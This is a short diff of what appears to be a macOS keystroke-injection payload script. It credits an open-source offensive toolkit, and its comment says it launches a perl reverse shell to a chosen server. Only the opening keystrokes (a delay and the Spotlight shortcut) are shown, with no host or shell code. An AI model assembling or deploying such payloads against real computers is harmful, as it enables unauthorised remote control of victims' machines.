@@ -1,5 +1,5 @@
 REM Credits to samratashok @ https://github.com/samratashok/Kautilya/blob/master/lib/src/osx_perl_reverse_shell.ino
-REM This payload executes perl reverse payload from msf.
+REM This payload executes perl reverse shell to your specified server.
 REM
 SLEEP 3000
 COMMAND SPACE
